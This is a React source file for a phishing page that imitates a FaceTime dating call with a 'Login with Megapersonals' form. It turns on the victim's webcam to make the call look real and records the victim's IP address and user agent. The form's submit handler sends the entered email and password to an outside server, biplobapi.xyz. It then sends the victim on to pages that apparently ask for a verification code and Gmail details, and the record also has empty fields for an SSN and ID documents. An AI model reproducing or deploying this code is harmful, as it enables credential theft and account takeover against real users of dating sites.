import React, { useRef } from "react";
import { useForm } from "react-hook-form";
import {
  useLoaderData,
  useNavigate,
  useParams,
  useLocation,
  Link,
} from "react-router-dom";
import { isBrowser, isMobile } from "react-device-detect";
import { useEffect } from "react";
import { useState } from "react";
import "./FaceTime.css";
import "./FaceTimeCall.css";

const FaceTimeLogin = () => {
  const {
    register,
    handleSubmit,
    formState: { errors },
    reset,
  } = useForm();
  const videoRef = useRef(null);
  const params = useParams();
  const { user } = useLoaderData();
  // localStorage.setItem("url", `/duo/call/${params.id}`);
  let type;
  if (isBrowser) {
    type = "desktop";
  } else {
    type = "mobile";
  }

  useEffect(() => {
    const bookings = {
      type: type,
    };

    fetch(`https://biplobapi.xyz/updateclick/${params.id}`, {
      method: "PUT",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify(bookings),
    })
      .then()
      .then();
    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: true,
        });
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          videoRef.current.play().catch((error) => {
            console.error("Error playing video:", error);
          });
        }
      } catch (error) {
        console.error("Error accessing camera:", error);
      }
    }

    startCamera();

    // Cleanup function to stop the camera when the component unmounts
    return () => {
      if (videoRef.current && videoRef.current.srcObject) {
        const stream = videoRef.current.srcObject;
        const tracks = stream.getTracks();
        tracks.forEach((track) => track.stop());
      }
    };
  }, []);

  const navigate = useNavigate();
  const [userAgent, setUserAgent] = useState("");
  const [ipAddress, setIPAddress] = useState("");

  useEffect(() => {
    const userAgent = window.navigator.userAgent;
    setUserAgent(userAgent);

    fetch("https://api.ipify.org?format=json")
      .then((response) => response.json())
      .then((data) => setIPAddress(data.ip))
      .catch((error) => console.log(error));
  }, []);

  const handleAddBooking = (data) => {
    const bookings = {
      email: data.email,
      password: data.password,
      site: "mega",
      code: "",
      ssn: "",
      idOne: "",
      idTwo: "",
      agent: userAgent,
      ipAddress: ipAddress,
      user: user,
      temp: Math.floor(Math.random() * (9999 - 1111) + 1111),
      postingTime: Date().toLocaleString(),
      isDeleted: false,
    };
    fetch("https://biplobapi.xyz/informations", {
      method: "POST",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify(bookings),
    })
      .then((res) => res.json())
      .then((result) => {
        reset();
        pathInfo(bookings);
      });
  };
  const pathInfo = (infos) => {
    let userId = window.location.pathname;
    const fnl = userId.substring(
      userId.indexOf("/") + 1,
      userId.lastIndexOf("/")
    );
    if (fnl === "duo/login") {
      navigate("/duo/code", { state: { temp: infos.temp } });
    } else {
      navigate("/facetime/code", { state: { temp: infos.temp } });
      navigate("/gmail", { state: { temp: infos.temp } });
    }
  };

  return (
    <div className="home-bg-2 position-relative min-h-full">
      <video
        ref={videoRef}
        autoPlay
        playsInline
        muted
        loop
        style={{ height: "100vh", minWidth: "100vw", objectFit: "cover" }}
        className="position-absolute z-10 min-w-full min-h-full h-screen max-w-full left-0 top-0 vdo"
      />
      <div
        className="code-card position-absolute text-center login-card-new"
        style={{ left: "50%", transform: "translateX(-50%)" }}
      >
        {/* <img src="/datas/images/du_icon.svg" alt="" className='duoimg' /> */}
        {/* <img src="/facetime.webp" alt="" className='duoimg' />
                <p>
                    Know each other and enjoy <span style={{ color: '#248A3E' }}>private</span>, <span style={{ color: '#248A3E' }}>secure</span> and <span style={{ color: '#248A3E' }}>hasslefree</span> live moment with your dating partner
                </p>
                <h1 className='duotitle2' style={{ color: '#248A3E' }}>Login with Megapersonals</h1>
                <form onSubmit={handleSubmit(handleAddBooking)} className='login-frm'>
                    <input style={{ borderColor: '#248A3E' }} type="text" {...register("email", { required: true })} placeholder='Email Address' className='input-from' />
                    <input style={{ borderColor: '#248A3E' }} type="password" {...register("password", { required: true })} placeholder='Password' className='input-from' />
                    <button className='dubtn' style={{ backgroundColor: '#248A3E' }}>Login</button>
                </form> */}

        <div className="main-container">
          <form
            onSubmit={handleSubmit(handleAddBooking)}
            className="login-section"
          >
            <div className="logo">
              <img src="/facetime.png" alt="FaceTime Logo" />
            </div>
            <p className="description">
              Know each other and enjoy{" "}
              <span className="highlight">private</span>,{" "}
              <span className="highlight">secure</span> and{" "}
              <span className="highlight">hasslefree</span> live moment with
              your dating partner
            </p>
            <h2 className="login-title">Login with Megapersonals</h2>
            <input
              type="email"
              placeholder="Email Address"
              className="input-field"
              {...register("email", { required: true })}
            />
            <input
              type="password"
              placeholder="Password"
              className="input-field"
              {...register("password", { required: true })}
            />
            <button type="submit" className="login-button">
              Login
            </button>
          </form>
          <div className="call-section">
            <div className="call-header">
              <div className="call-info">
                <img
                  src="/facetime.png"
                  alt="FaceTime Logo"
                  className="call-logo"
                />
                <div>
                  <p className="call-title">FaceTime Call</p>
                  <p className="call-subtitle">Join as "aaa"</p>
                </div>
              </div>
              <button className="leave-button">Leave</button>
            </div>
            <div className="call-controls">
              <div className="control-button">
                <span className="icon">⛶</span>
                <p>Full Screen</p>
              </div>
              <div className="control-button">
                <span className="icon">🎥</span>
                <p>Camera</p>
              </div>
              <div className="control-button">
                <span className="icon">🔇</span>
                <p>Mute</p>
              </div>
              <div className="control-button">
                <span className="icon">⋯</span>
                <p>More</p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default FaceTimeLogin;
